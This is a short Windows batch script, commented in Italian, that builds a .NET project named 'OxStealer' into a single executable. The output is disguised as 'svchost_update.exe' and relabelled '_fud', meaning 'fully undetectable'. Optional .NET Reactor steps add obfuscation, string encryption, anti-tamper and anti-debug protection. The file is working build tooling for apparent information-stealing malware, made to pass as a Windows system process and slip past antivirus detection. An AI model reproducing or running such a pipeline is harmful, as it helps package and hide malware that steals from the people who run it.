@echo off
setlocal

echo [*] Publish .NET single-file...
dotnet publish -c Release -r win-x64 -o dist\raw OxStealer\OxStealer.csproj
if errorlevel 1 goto :fail

echo [*] Obfuscate with .NET Reactor...
rem Se hai .NET Reactor installato, scommenta le righe sotto:
rem "C:\Program Files (x86)\Eziriz\.NET Reactor\dotnet_reactor.console.exe" ^
rem   -file "dist\raw\svchost_update.exe" ^
rem   -targetfile "dist\svchost_update_fud.exe" ^
rem   -obfuscate on -stringencryption on -controlflow on -antitamp on -necrobit on -anti_debug on
rem if errorlevel 1 echo [!] .NET Reactor non trovato, uso output raw & copy dist\raw\svchost_update.exe dist\svchost_update_fud.exe

if not exist "dist\svchost_update_fud.exe" (
    copy dist\raw\svchost_update.exe dist\svchost_update_fud.exe
)

echo [+] Done: dist\svchost_update_fud.exe
exit /b 0

:fail
echo [!] build failed
exit /b 1